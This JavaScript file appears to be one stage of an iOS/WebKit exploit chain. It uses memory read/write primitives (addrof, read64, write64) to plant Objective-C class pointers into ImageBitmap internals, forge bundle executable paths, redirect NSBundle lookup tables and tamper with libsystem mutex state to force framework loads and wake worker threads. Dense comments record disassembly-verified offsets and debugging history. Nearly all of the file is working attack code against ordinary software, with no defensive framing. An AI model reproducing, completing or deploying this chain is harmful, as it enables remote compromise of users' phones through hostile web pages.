let MessageName;
const convBuf = new ArrayBuffer(8);
const u8 = new Uint8Array(convBuf);
const u32 = new Uint32Array(convBuf);
const u64 = new BigUint64Array(convBuf);
const f64 = new Float64Array(convBuf);
p = {};
var p_rce = {
    _root: []
};

function itof(value) {
    u64[0] = BigInt.asUintN(64, value);
    return f64[0];
}
function ftoi(value) {
    f64[0] = value;
    return u64[0];
}
function hex(value) {
    if (typeof value !== "bigint") return String(value);
    return "0x" + value.toString(16);
}
function noPAC(value) {
    return value & 0x7fffffffffn;
}
const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT';               // worker1 wake: needs a vehicle whose initializers have static C++ destructors (what __cxa_atexit actually REGISTERS at runtime). Low-init frameworks DISPROVEN (2026-07-23): Proximity (1-2 inits) loaded 1100->1101 but GEN TIMEOUT every attempt -- ObjC/C-only inits, no runtime cxa registration, no drop. TextInput bundles are resource-only (no executable). XOJIT: ~71 real cxa registrations (produces drops), NOT resident at fire time, NOT in TT's closure. (MacinTalk disproven: RESIDENT via worker1's own TT load.) MUST NOT be XGBoost -- stage6's gate-free slow_dlopen needs that FRESH (a resident target -> no new inits -> no drop -> worker2 never wakes)
const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI';               // worker2 wake: DarkSword's PROVEN wake framework (git 4e2aad1 WAKE_PATHS) -- DISTINCT family from XGBoost, never resident -> loads fresh and its C++ initializers' __cxa_atexit produce the drop. MacinTalk REPLACED (2026-08-02): 3 inits loaded fresh (1107->1109) but produced NO cxa registration -> GEN TIMEOUT every run (the documented low-init failure: ObjC/C-only inits, no runtime cxa registration, no drop)
async function fireWorkerWake(path, tok, opts) {
    postMessage(`[mapredir] worker wake: ${path}`);
    return await wakeViaMapRedirect(path, tok, opts);
}

BigUint64Array.prototype.data = function () { return p.read64(p.addrof(this) + 0x10n); };

// Synchronous logger: blocks the worker (sync XHR) until the server has written the line, so the
// log right before a crash/hang is guaranteed delivered AND in exact order -- unlike postMessage ->
// Image beacon, which is async and reorders/drops. Drop slog("reached X") anywhere to pin the exact
// execution point. Server origin is injected as self.__SLOG_ORIGIN by the harness (falls back to
// postMessage if unavailable, e.g. running standalone).

function slog(msg) {
    // async + circuit breaker: a dead/hung log server must NEVER stall the dance (sync XHR to a
    // hung socket blocks the worker for the full TCP timeout). Lines keep sequence numbers (t=n)
    // so order is reconstructable; if the server is unreachable we mirror to the page instead.
    const n = (slog._n = (slog._n || 0) + 1);
    if (slog._dead) { try { postMessage("[slog] " + msg); } catch (_) { } return; }
    try {
        const line = encodeURIComponent(("#" + n + " " + String(msg)).slice(0, 400));
        const x = new XMLHttpRequest();
        x.open("GET", (self.__SLOG_ORIGIN || "") + "/log?kind=slog&t=" + n + "&msg=" + line, true);
        x.onerror = () => { slog._dead = true; try { postMessage("[slog] server unreachable -- mirroring to page"); } catch (_) { } };
        x.send();
    } catch (e) {
        slog._dead = true;
        try { postMessage("[slog] " + msg); } catch (_) { }
    }
}

class Encoder {
    constructor(messageName, destinationID) {
        this.argList = [];
        if (arguments.length) {
            this.messageName = messageName;
            this.destinationID = destinationID;
            this.encode('uint8_t', 0);
            this.encode('uint16_t', this.messageName);
            this.encode('uint64_t', this.destinationID);
        }
    }
    encode(type, value) {
        this.argList.push({
            type,
            value
        });
        return this;
    }
    encode8BitString(str) {
        this.encode('uint32_t', str.length);
        this.encode('bool', true);
        this.argList.push({
            type: 'bytes',
            value: str
        });
        return this;
    }
    encodeNullString() {
        this.encode('uint32_t', 0xffffffff);
        return this;
    }
    static argumentAlignment(arg) {
        switch (arg.type) {
            case 'uint64_t':
            case 'int64_t':
                return 8;
            case 'uint32_t':
            case 'int32_t':
            case 'float':
                return 4;
            case 'uint16_t':
            case 'int16_t':
                return 2;
            case 'uint8_t':
            case 'int8_t':
            case 'bool':
                return 1;
            case 'bytes':
                return 0;
            default:
                ASSERT_NOT_REACHED(`Encoder.argumentAlignment(): unexpected type name: ${arg.type}`);
        }
    }
    static argumentSize(arg) {
        switch (arg.type) {
            case 'uint64_t':
            case 'int64_t':
                return 8;
            case 'uint32_t':
            case 'int32_t':
            case 'float':
                return 4;
            case 'uint16_t':
            case 'int16_t':
                return 2;
            case 'uint8_t':
            case 'int8_t':
            case 'bool':
                return 1;
            case 'bytes':
                if (typeof arg.value == 'string') {
                    return arg.value.length;
                } else {
                    return arg.value.byteLength;
                }
            default:
                ASSERT_NOT_REACHED(`argumentSize(): unexpected type name: ${arg.type}`);
        }
    }
    buffer() {
        if (this.__buffer) return this.__buffer;
        let bufferSize = 0;
        for (const arg of this.argList) {
            const alignment = Encoder.argumentAlignment(arg);
            const remainder = bufferSize % alignment;
            if (remainder) {
                bufferSize += alignment - remainder;
            }
            bufferSize += Encoder.argumentSize(arg);
        }
        const buffer = new ArrayBuffer(bufferSize);
        const view = new DataView(buffer);
        let bufferOffset = 0;
        for (const arg of this.argList) {
            const alignment = Encoder.argumentAlignment(arg);
            const remainder = bufferOffset % alignment;
            if (remainder) {
                bufferOffset += alignment - remainder;
            }
            switch (arg.type) {
                case 'float':
                    view.setFloat32(bufferOffset, arg.value, true);
                    break;
                case 'uint64_t':
                    view.setBigUint64(bufferOffset, arg.value, true);
                    break;
                case 'int64_t':
                    view.setBigInt64(bufferOffset, arg.value, true);
                    break;
                case 'uint32_t':
                    view.setUint32(bufferOffset, arg.value, true);
                    break;
                case 'int32_t':
                    view.setInt32(bufferOffset, arg.value, true);
                    break;
                case 'uint16_t':
                    view.setUint16(bufferOffset, arg.value, true);
                    break;
                case 'int16_t':
                    view.setInt16(bufferOffset, arg.value, true);
                    break;
                case 'uint8_t':
                    view.setUint8(bufferOffset, arg.value);
                    break;
                case 'int8_t':
                    view.setInt8(bufferOffset, arg.value);
                    break;
                case 'bool':
                    view.setInt8(bufferOffset, !!arg.value);
                    break;
                case 'bytes':
                    const buffer_u8 = new Uint8Array(buffer);
                    if (typeof arg.value == 'string') {
                        for (let i = 0; i < arg.value.length; ++i) buffer_u8[bufferOffset + i] = arg.value.charCodeAt(i);
                    } else {
                        for (let i = 0; i < arg.value.byteLength; ++i) buffer_u8[bufferOffset + i] = arg.value[i];
                    }
                    break;
                default:
                    ASSERT_NOT_REACHED(`buffer(): unexpected type name: ${arg.type}`);
            }
            bufferOffset += Encoder.argumentSize(arg);
        }
        return this.__buffer = buffer;
    }
};
const canvas = new OffscreenCanvas(64, 64);
// --- atexit mutex state management (26.1 protocol, disasm-verified on 23B85 libsystem_c +
// libsystem_pthread): pthread_mutex_t at 0x1ed3f0b60 (NORMAL flavor; bits 2-3 of +0xc == 0).
// The 64-bit ulock word is at +0x20 (align8(x0+0x27) in the fast lock, fast unlock AND slow
// entry; owner slot at +0x18). Word layout: bit0 (0x01) = kernel-ulock-allocated flag,
// bit1 (0x02) = HELD, low-half bits 8-31 = waiter count (+0x100 per registered waiter),
// high-half bits 8-31 = wake generation (+0x100 per drop).
// pthread_mutex_unlock fast path (0x1df14da44): if (low & 0xffffff00) == (high & 0xffffff00)
// it just clears HELD -- NO kernel call. unlock_slow (0x1df14dfc4) fires only when count > gen:
// clears HELD, bumps gen by 0x100<<32, then __psynch_mutexdrop wakes every thread sleeping on
// the word. 26.1 ASSERT (NEW vs 18.6): a drop returning -1 with errno outside {0, EINTR} --
// ENOENT when NO thread is sleeping on the word -- kills the UNLOCKER at brk #0xb001
// "BUG IN LIBPTHREAD: __psynch_mutexdrop failed" (0x1df14ed48, msg @ 0x1df158cce). DarkSword's
// bare 0x101 (count=1, gen=0) invites exactly that drop on the next unlock by ANY thread; on
// 18.6 the ENOENT was silent. So on 26.1: count>gen ONLY while a sleeper really exists;
// otherwise keep count == gen and no drop is ever issued. A plain value write NEVER wakes a
// sleeper (no kernel notification) -- only a real unlock's drop does.
// SEED-AND-VERIFY (2026-07-22): the onceToken seed is a small value written by write64's split
// path, which SILENTLY FAILS under the fire's concurrent load (§5s: "the seed silently not
// landing is how this recurs"). Write, re-link, read back, retry up to 4x; log the final read
// so the run log PROVES the seed landed (or names the miss instead of brking on a wrong token).
function seedTokenVerify(value, tag) {
    const A = offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken;
    let got = 0n;
    for (let i = 0; i < 4; i++) {
        p.reestablishRead64();
        p.write64(A, value);
        p.reestablishRead64();
        got = p.read64(A);
        if (got === value) { postMessage(`[seed] ${tag}: token=${hex(got)} OK (try ${i + 1})`); return true; }
    }
    postMessage(`[seed] ${tag}: MISS after 4 tries (token=${hex(got)} want ${hex(value)})`);
    return false;
}
// SPIN THROTTLE (2026-07-22, the vphone restarts): the tight read64 polls (millions of spins/sec
// across the chain + poller + workers) pin the vphone's CPU and trip its device-level watchdog ->
// reboot. Sleep ~1ms every 2048 spins in every hot loop (~30-60% duty) -- the waited-for events
// are ~10-50ms timescale, so this costs almost nothing in latency but drops the device load to
// survivable. Used by every poll below (outer wake poll, CAS/gen/store/completion spins, stage6).
async function spinYield(g) { if ((g & 0x7ff) === 0) await new Promise(r => setTimeout(r, 1)); }
// COOL variant for the long one-way waits (store-sync / wake polls / registration wait):
// ~2.3ms work burst + 4ms sleep ~= 36% duty (vs ~90% for spinYield). The 10M+-spin wake
// polls at 90% duty are what trips the vphone's CPU watchdog into a reboot (load 29-30
// observed 2026-07-22). The timing-critical gate spins (CAS/gen/HELD/completion) keep spinYield.
async function spinYieldCool(g) { if ((g & 0x1ff) === 0) await new Promise(r => setTimeout(r, 4)); }
const Atexit_mutexStateAddr = () => offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
// PARK: held + a registered waiter, gen zeroed (worker blocks; a later drop with count>gen wakes it).
function atexitHold() { p.write64(Atexit_mutexStateAddr(), 0x102n); }
// PASS (benign): held clear, count == gen (0x100 each) -> every future unlock takes the fast
// path: no drop, no brk, and no sleeper is woken. Unconditionally safe on 26.1.
function atexitPass() { p.write64(Atexit_mutexStateAddr(), 0x0000010000000101n); }
// WAKE: 0x101 leaves count(0x100) > gen(0), so the NEXT real __cxa_atexit unlock drops and
// wakes every sleeper on the word (a value write alone never does). Call ONLY when a worker is
// protocol-known to be parked (p.workerParked -- set at the page triggers, cleared at each
// poll's success): the word's own count field is NOT a reliable sleeper indicator (silent/hold
// re-writes clobber the registration while the worker keeps sleeping in the kernel). With a
// real sleeper the drop returns 0; with none, 26.1 brks the unlocker (brk #0xb001).
function atexitWake() { p.write64(Atexit_mutexStateAddr(), 0x101n); }
// SILENT: proceed with NO broadcast: held + waiter clear, kernel flag kept, count == gen -> a
// release takes the no-waiters path and the parked worker stays parked.
function atexitSilent() { p.write64(Atexit_mutexStateAddr(), 0x01n); }
// legacy name used across the chain: arm the wake state before a load (a worker is parked).
function armAtexitPass() { atexitWake(); }

// Scan a parked worker's stack for candidate RETURN ADDRESSES (shared-cache code range) so we can
// symbolize the exact function its dlopen is stuck in offline (ipsw a2s). This answers the one
// question everything hinges on: does the woken worker's dlopen RETURN, or where does it park?
function dumpWorkerStack(worker, tag) {
    try {
        const sb = p.read64(worker.thread + structs.Thread_stackBottom);
        const st = p.read64(worker.thread + structs.Thread_stackTop);
        const out = [];
        for (let a = st; a < sb && out.length < 48; a += 8n) {
            const v = p.read64(a);
            if (v > 0x180000000n && v < 0x210000000n && (v & 3n) === 0n) out.push(hex(v - p.slide));
        }
        postMessage(`[stackdump ${tag}] ${out.length} cands: ${out.join(' ')}`);
    } catch (e) { postMessage(`[stackdump ${tag}] ERR ${e && (e.message || e)}`); }
}

async function loadObjcClass(cls) {
    const cx = canvas.getContext('2d', { willReadFrequently: true });
    cx.fillStyle = '#f00';
    cx.fillRect(0, 0, 64, 64);
    const bitmap = await createImageBitmap(canvas);
    const ab = p.addrof(bitmap);
    slog(`[loadObjcClass cls=${hex(cls)}] addrof(bitmap)=${hex(ab)}`);
    const wrappedBitmap = p.read64(ab + p.structs.JSImageBitmap_wrapped);
    const imagebuffer = p.read64(wrappedBitmap + p.structs.ImageBitmap_buffer);
    p.write64(imagebuffer + p.structs.ImageBuffer_objcClass, cls);
    // NOTE: do NOT zero the loader onceToken here. DarkSword zeroes only at the re-arm/fire
    // sites. Zeroing before EVERY plant races EVERY in-flight dispatch_once completion
    // (a parked worker's AVLoadSpeech gate completing after our re-zero -> foreign port ->
    // _dispatch_gate_broadcast_slow brk) and drove the crash rate to ~100% on 26.1.
    slog(`[loadObjcClass] class planted; close()...`);
    bitmap.close();
    // park-next: hold the mutex with a registered waiter (0x102) so the NEXT worker's __cxa_atexit
    // blocks AND its later release wakes it. SUPPRESSED during wake broadcasts (p.noAtexitPark):
    // a wake load must leave the mutex unheld, or the woken worker's re-acquire re-parks it.
    if (!p.noAtexitPark) atexitHold();
}

// _dispatch_gate_broadcast_slow (libdispatch, 23B85) asserts the COMPLETING thread owns the gate
// (onceToken == its own tsd port; |1/|2 contention bits are TOLERATED, AGENTS.md §5i). The
// woken worker's dispatch_once (from its park) completes only once its gate block RETURNS — and
// worker1's block sits in Bambi session/analytics XPC after its NSBundle load finished (§5n
// disasm: no in-image blocking prims; the lag is SERVICE latency, uncontrollable, observed >12s).
// Meanwhile the token still holds fire-2's seed (w1tok&~3) — the ONLY value its completion can
// legally unlock. If we re-zero/reseed before that completion lands (stage5-tail, stage6, fire
// 3's seed), the completion sees a foreign port -> brk (the fire-3 deaths). So: after worker1's
// interpose, HOLD atexitPass and wait for the token to reach -1 (its completion landing on the
// seed) BEFORE any re-zero. Timeout is 60s (XPC latency, not lock latency — 12s was too short).
// Yield via setTimeout so the worker gets scheduled.
async function waitGateQuiesce(tag) {
    let waited = 0;
    let tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
    while (tok !== 0xffffffffffffffffn && waited < 60000) {
        atexitPass();   // keep the atexit mutex PASS so the woken worker's epilogue __cxa_atexit calls proceed -> its dlopen returns -> its gate completes
        await new Promise(r => setTimeout(r, 25));
        waited += 25;
        if (waited % 5000 === 0) postMessage(`[gatequiesce] ${tag}: still waiting +${waited}ms tok=${hex(tok)}`);
        tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
    }
    postMessage(`[gatequiesce] ${tag}: ${waited}ms tok=${hex(tok)}${waited >= 60000 ? ' (TIMEOUT — gate did NOT complete; a dump of the worker park site would tell us why)' : ''}`);
}

// Synchronous web-feature dlopens (the writeup's "alternative path"): each of these makes WebCore
// synchronously dlopen a fresh framework through PAL::softLink / ImageIO on THIS thread -- no
// NSBundle, no TT._lock -- and the fresh image's ___cxa_atexit release broadcasts on the atexit
// mutex. With the waiter bit armed, that is the wake. Worker-safe subset only (no window APIs).
function pumpSoftlink() {
    // DISABLED (2026-07-22): codec/Vision instantiation is pure framework-load overhead (and mostly
    // no-ops over plain http on a LAN origin, per run 260719_014753's note) -- it spikes images right
    // after baseline, correlating with the clean tab reloads there (footprint stays ~7MB, so these
    // are NOT memory-pressure; they're teardown/unresponsiveness at the load event).
    return;
}

// --- instrumented probe battery (run 260719_014753: pump v3 + WAKE_CLASS produced ZERO
// __cxa_atexit activity in 12M spins). Two facts established post-mortem: (1) most pump calls are
// SECURE-CONTEXT APIs (VideoDecoder/BarcodeDetector/SpeechRecognition) which are `undefined` over
// plain http on a LAN origin -- the try/catch swallowed it, so the pump was likely a NO-OP; (2) the
// WAKE_CLASS plant of PKContact triggered no loader at all (loadObjcClass only rides the
// AVFAudio->TextToSpeech deferred loader; the planted class is just the trigger).
// pumpProbe() runs each candidate with BEFORE/AFTER reads of dyld's loaded-image count
// (RuntimeState.loaded.size @ +0x30) and the atexit word, so the NEXT run log shows exactly which
// call (if any) performs a fresh in-process dlopen on this vphone. Winners are remembered in
// p.pumpWinners and re-fired every 3M spins inside the wake loops.
function dyldLoadedCount() { try { return p.read64(p.runtimeState + 0x30n); } catch (e) { return 0xffffn; } }
function pumpProbe() {
    const A = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
    const winners = [];
    postMessage(`[probe] typeof VD=${typeof VideoDecoder} VE=${typeof VideoEncoder} AD=${typeof AudioDecoder} AE=${typeof AudioEncoder} BD=${typeof BarcodeDetector} FF=${typeof FontFace} AC=${typeof AudioContext} OC=${typeof OffscreenCanvas}`);
    const probe = (name, fn) => {
        const l0 = dyldLoadedCount(), a0 = p.read64(A);
        let err = '';
        try { fn(); } catch (e) { err = ' ERR:' + (e && (e.message || e)); }
        const l1 = dyldLoadedCount(), a1 = p.read64(A);
        postMessage(`[probe] ${name}: loaded ${l0}->${l1} atexit ${hex(a0)}->${hex(a1)}${err}`);
        if (l1 !== l0 && l1 !== 0xffffn) winners.push(fn);   // fresh load happened -> re-fire this one
    };
    probe('VideoDecoder-h264', () => { new VideoDecoder({ output() { }, error() { } }).configure({ codec: 'avc1.42001f', optimizeForLatency: true }); });
    probe('BarcodeDetector', () => { new BarcodeDetector({ formats: ['qr_code'] }); });
    probe('canvas-filter-CoreImage', () => { const cx = new OffscreenCanvas(32, 32).getContext('2d'); cx.filter = 'blur(2px)'; cx.fillStyle = '#f00'; cx.fillRect(0, 0, 32, 32); });
    probe('convertToBlob-heic', () => { new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/heic' }); });
    probe('createImageBitmap-jxl', () => { /* placeholder: no JXL blob embedded; skip */ });
    probe('AudioContext', () => { const AC = self.AudioContext || self.webkitAudioContext; if (!p.__probeAC) p.__probeAC = new AC(); });
    p.pumpWinners = winners;
    postMessage(`[probe] winners=${p.pumpWinners.length} loadedCount=${dyldLoadedCount()} (if 0: nothing JS-reachable loads a fresh framework on this origin -- need https or a second deferred-loader pair)`);
}
function pumpRefireWinners() {
    if (!p.pumpWinners) return;
    for (const fn of p.pumpWinners) { try { fn(); } catch (e) { } }
}

// =====================================================================
// Deterministic broadcast wakes (2026-07-19, from extracted/deferred-loader-pairs.md):
// JS-reachable fresh loads are exhausted on this device (run 022451: loadedCount=1539, winners=0),
// and the AVFAudio->TextToSpeech loader always takes TT._lock (abort vs worker's stale unlock).
// The wake therefore comes from PLANTING a class whose +initialize loads a FRESH framework with
// no TT._lock involvement:
//   1. UIManagedDocument (UIKitCore, always loaded) +initialize -> dlopen(CoreData) DIRECTLY,
//      no NSBundle, no lock. Class = 0x1ee3f9980.
//   2. GCEventInteraction (GameController) +initialize -> NSBundle load of GameControllerUI on
//      its OWN bundle lock. Class = 0x1edecf130. Prereq: GameController.framework loaded (done
//      silently through the TT bundle with atexit=0 -- safe: worker is parked, no wake armed).
//   3. AVVCMetricsManager (AVFAudio, loaded by stage4) -init -> dlopen(libAudioIssueDetector).
//      Works only if the plant fully instantiates (not just +initialize) -- self-diagnosing.
// fireWakeTarget() logs the dyld loaded-image delta, so a target that produced no load is
// abandoned automatically; targets that fired once are SPENT (a loaded framework never re-fires
// __cxa_atexit). Stages share one cursor (p.wakeTargetIdx) so stage6 continues past stage5's spent
// targets. The 0x03 park-write in loadObjcClass is SUPPRESSED during wake broadcasts
// (p.noAtexitPark) -- it would re-lock the atexit mutex in the woken worker's face.
function initWakeTargets() {
    if (p.wakeTargets) return;
    p.wakeTargets = [
        { name: 'SoundAnalysis via _MLSNFrameworkHandle', cls: offsets.CoreML__OBJC_CLASS___MLSNFrameworkHandle },
        { name: 'Vision via _MLVNFrameworkHandle', cls: offsets.CoreML__OBJC_CLASS___MLVNFrameworkHandle },
        { name: 'NaturalLanguage via _MLNLPFrameworkHandle', cls: offsets.CoreML__OBJC_CLASS___MLNLPFrameworkHandle },
        { name: 'CoreData via UIManagedDocument', cls: offsets.UIKitCore__OBJC_CLASS__UIManagedDocument },
        { name: 'ManagedConfiguration via LSApplicationRestrictionsManager', cls: offsets.CoreServices__OBJC_CLASS__LSApplicationRestrictionsManager },
        {
            name: 'GameControllerUI via GCEventInteraction', cls: offsets.GameController__OBJC_CLASS__GCEventInteraction,
            prereq: '/System/Library/Frameworks/GameController.framework/GameController'
        },
        { name: 'libAudioIssueDetector via AVVCMetricsManager', cls: offsets.AVFAudio__OBJC_CLASS__AVVCMetricsManager },
    ];
    if (p.wakeTargetIdx === undefined) p.wakeTargetIdx = 0;
}
function nextWakeTarget() {
    initWakeTargets();
    while (p.wakeTargetIdx < p.wakeTargets.length) {
        const t = p.wakeTargets[p.wakeTargetIdx++];
        if (!t.spent) return t;
    }
    return null;
}
async function loadPrereqSilently(path, lockAddr, tok) {
    postMessage(`[wake] silent TT-load of prereq: ${path}`);
    const cs = p.makeCString(path);
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n);
    p.write8(p.TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cs.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cs.len);
    atexitSilent();   // prereq load must not broadcast (parked worker stays parked)
    p.silentLoad = true;
    await loadObjcClass(nextAVSpeechClass());
    p.silentLoad = false;
    // the silent load cycled TT._lock through chain_tok -> 0; restore the seed so the parked
    // worker's stale unlock stays legal.
    p.write32le(lockAddr, tok);
}
async function fireWakeTarget(t, lockAddr, tok) {
    p.noAtexitPark = true;
    try {
        if (t.prereq && !t.prereqDone) {
            await loadPrereqSilently(t.prereq, lockAddr, tok);
            t.prereqDone = true;
        }
        const l0 = dyldLoadedCount();
        atexitWake();   // a worker is parked: arm the wake so the fire's real unlocks drop to it (guarded)
        try { await loadObjcClass(t.cls); } catch (e) { postMessage(`[wake] ${t.name} ERR ${e && (e.message || e)}`); }
        const l1 = dyldLoadedCount();
        t.spent = (l1 !== l0);
        postMessage(`[wake] fired ${t.name}: loaded ${l0}->${l1}${t.spent ? ' SPENT' : ' (no fresh load -- will try next target)'}`);
        atexitPass();   // benign pass (count==gen): no drop armed here; the wake sites re-arm as needed
    } finally {
        p.noAtexitPark = false;
    }
}

// The AVFAudio loader lives in the +initialize of 7 AVSpeech* classes, and +initialize fires ONCE
// per class EVER -- a reused class fires NOTHING (this was the 052941 failure: the wake used
// Voice, already spent by stage5's silent load, so the loader never ran). Also the loader's
// +initialize stub early-returns when its onceToken==-1, so every fire must RESET the token
// (same as rearmCFBundleLoader does for the park loads). ProviderRequest/Voice/Utterance are
// consumed by stage4/stage5/stage6 and Marker is reserved for worker2's park -- the wake pool:
const AV_SPEECH_WAKE_POOL = [
    'AVFAudio__OBJC_CLASS__AVSpeechSynthesizer',
    'AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderVoice',
    'AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit',
];
function nextAVSpeechClass() {
    const i = (p.avSpeechWakeIdx = (p.avSpeechWakeIdx ?? 0) + 1) - 1;
    return offsets[AV_SPEECH_WAKE_POOL[i % AV_SPEECH_WAKE_POOL.length]];
}

// ================= NSMapTable redirect wake (PRIMARY wake mechanism, 2026-07-19) =================
// bundleWithPath: consults ONLY the _resolvedPathToBundles NSMapTable (tables+0x28; layout:
// parallel flat key/value arrays at ivar offsets stored in globals -- bundleWithPath-and-round2.md).
// Swapping the TTS entry's VALUE to a CLONED bundle (own lock word, re-armed cloned CFBundle with a
// fresh forged execPath) makes the proven AVSpeech plant load ANY fresh framework through the
// CLONE's lock: TT._lock never leaves the parked worker's token, so its stale unlock is always
// legal. The TTS entry is found by VALUE (we know the TT bundle pointer) -- no string reads.
// The original value is restored after every fire (stage6's park loads need the real TT bundle).
function tableMapInfo() {
    const tables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
    const map = p.read64(tables + 0x28n);
    return {
        map,
        count: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_countOff))),
        keys: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_keysOff))),
        values: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_valuesOff))),
    };
}
function setupMapRedirect() {
    // NOTE (2026-08-02): a "fresh borrow" rotation was tried for worker2's wake but the rotated
    // candidate (idx4, embedded CFBundle) crashed the spare's gate -> reverted to REUSING the known
    // good first candidate (idx0, a real loaded framework). The borrow is restored after every fire.
    if (p.mapRedir) return p.mapRedir;
    const { count, values } = tableMapInfo();
    let ttSlot = 0n, ttOrig = 0n, borrow = 0n, borrowIdx = -1n;
    for (let i = 0n; i < count; ++i) {
        const v = p.read64(values + i * 8n);
        let bpath = '?';
        if (v > 0x100000000n) try { const ip = p.read64(v + structs.NSBundle_initialPath); if (ip > 0x180000000n && ip < 0x210000000n) { const dp = p.read64(ip + structs.CFString_dataPtr); if (dp > 0x180000000n && dp < 0x210000000n) bpath = readCString(dp, 80); } } catch (e) { }
        postMessage(`[mapredir] bundle[${i}]=${hex(v)} path="${bpath}"`);
        if (v === p.TextToSpeech_NSBundle) { ttSlot = values + i * 8n; ttOrig = v; }
        else if (!borrow && v > 0x100000000n && p.read64(v + structs.NSBundle_cfBundle) !== 0n) { borrow = v; borrowIdx = i; }
    }
    if (!ttSlot) { postMessage('[mapredir] TT bundle NOT in _resolvedPathToBundles'); return null; }
    if (!borrow) { postMessage('[mapredir] no borrowable bundle found (need one WITH a CFBundle)'); return null; }
    const borrowCF = p.read64(borrow + structs.NSBundle_cfBundle);
    p.mapRedir = {
        slot: ttSlot, orig: ttOrig, borrow, borrowIdx, borrowCF,
        savedFlags: p.read64(borrow + structs.NSBundle_flags),
        savedExec: p.read64(borrowCF + structs.CFBundle_execPath),
    };
    postMessage(`[mapredir] armed: ttSlot=${hex(ttSlot)} orig=${hex(ttOrig)} borrow=${hex(borrow)} (idx ${borrowIdx}) cf=${hex(borrowCF)}`);
    return p.mapRedir;
}
function readCString(addr, maxLen) {
    let s = '';
    for (let i = 0n; i < BigInt(maxLen); i += 8n) {
        const c = p.read64(addr + i);
        for (let j = 0n; j < 8n; j++) {
            const b = Number((c >> (j * 8n)) & 0xffn);
            if (b === 0) return s;
            s += String.fromCharCode(b);
        }
    }
    return s;
}
// fire autopsy: pinpoint WHERE the borrowed-bundle wake stops (run-260719_105947 fired but
// produced zero load, no crash). Reads, right after the plant's close():
//   onceToken  -1 = the AVFAudio loader block RAN (0 = trigger never fired -> plant problem)
//   borrow.path = the borrowed bundle's identity (is it a proper loaded-framework bundle?)
//   cf.loaded  1 = CFBundleLoadExecutable RAN (0 = it never got there: isLoaded skipped, or the
//              loader resolved something else; 0 + count-delta>0 = the load errored)
//   borrow.isa, borrow.flags, cf.exec = sanity on our re-arm landing
function fireAutopsy(mr, l0) {
    try {
        const tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
        const cfNow = p.read64(mr.borrow + structs.NSBundle_cfBundle);
        const cfLoaded = p.read64(cfNow + structs.CFBundle_loadedFlag) & 0xffn;
        const cfExec = p.read64(cfNow + structs.CFBundle_execPath);
        const flags = p.read64(mr.borrow + structs.NSBundle_flags);
        // TRACE PROBE (2026-07-23): read the forged exec-path CFString's CONTENT (what the spare's
        // block actually dlopens). If the string rewrite didn't land it still says TextToSpeech and
        // the spare's dlopen is a resident no-op (no initializers -> no registrations -> GEN TIMEOUT).
        let forgedPath = '?';
        try {
            const sdp = p.read64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr);
            if (sdp > 0x100000000n) forgedPath = readCString(sdp, 96);
        } catch (e) { }
        let bpath = '?';
        try {
            const ip = p.read64(mr.borrow + structs.NSBundle_initialPath);
            if (ip > 0x180000000n && ip < 0x210000000n) { const dp = p.read64(ip + structs.CFString_dataPtr); if (dp > 0x180000000n && dp < 0x210000000n) bpath = readCString(dp, 96); }
        } catch (e) { }
        postMessage(`[mapredir] autopsy: onceToken=${hex(tok)} (want -1=block ran) borrow.path="${bpath}" forgedPath="${forgedPath}" cf.loaded=${cfLoaded} cf.exec=${hex(cfExec)} flags=${hex(flags)} loadedNow=${dyldLoadedCount()} (was ${l0})`);
    } catch (e) { postMessage(`[mapredir] autopsy ERR ${e && (e.message || e)}`); }
}
// Plant an ObjC class on a worker's ImageBitmap via R/W (same wrapped->imageBuffer->objcClass path
// as loadObjcClass, but targeting a specific worker's globalThis[1] bitmap address).
function plantOnBitmap(bitmap, cls) {
    const wrappedBitmap = p.read64(bitmap + structs.JSImageBitmap_wrapped);
    const imageBuffer = p.read64(wrappedBitmap + structs.ImageBitmap_buffer);
    p.write64(imageBuffer + structs.ImageBuffer_objcClass, cls);
}
async function wakeViaMapRedirect(path, tok, opts) {
    opts = opts || {};
    // EARLY-OUT (2026-07-22, lldb-proven: two simultaneous wrong-owner brks, frozen in-flagrante):
    // if worker1's store ALREADY landed, worker1 is AWAKE and its completion is PENDING (epilogue
    // -> NSBundle unlock -> session XPC -> dispatch_once completion). The re-zero+spare-CAS below
    // walks the token through 0 -> spareTok, and worker1's completion (which only ever finds
    // w1tok legal) brks on it -- AND the spare's own fast completion brks on the w1tok seed.
    // lldb: BOTH threads frozen at libdispatch+0x36874 in the same instant. worker1's arc finishes
    // BY ITSELF (store -> unlock -> completion on w1tok -> token -1, all legal) -- so when the
    // store is already in, fire NOTHING and touch NOTHING; the poll's lock!=w1tok clears on its own.
    // EXTENSION: worker1 may be awake WITHOUT its store in yet (ambient-woken during stage4->5,
    // before the silent write). A drop bumps the atexit wake-generation (high half) the FIRST time
    // any unlock fires with count>gen, and it never clears -- so gen != 0 is proof worker1 MAY be
    // awake with a completion pending, and the re-zero below would brk it. Skip the fire there too:
    // worker1's own arc still produces the store (and its completion stays legal on w1tok).
    const __A = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
